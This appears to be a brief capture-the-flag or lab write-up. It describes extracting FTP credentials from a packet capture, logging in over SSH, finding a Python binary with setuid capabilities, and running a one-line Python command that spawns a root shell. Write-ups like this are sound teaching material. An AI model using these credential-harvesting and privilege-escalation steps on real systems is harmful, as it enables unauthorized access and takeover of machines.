**Extracting FTP Credentials:**
- Opened the directory `/data/0` and downloaded the pcap file.
- Analyzed the pcap file using Wireshark to extract FTP credentials:
![[Pasted image 20250202203135.png]]

**Gaining Initial Access:**
- Authenticated via SSH using the extracted credentials:
`ssh nathan@<target_ip>`

**Identifying Privilege Escalation Vectors:**
- Ran the following command to find files with elevated capabilities:
`getcap -r / 2>/dev/null`
Result:
`/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`

**Exploiting Python3 Capabilities:**
- Used the following exploit to escalate privileges to root:
`python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`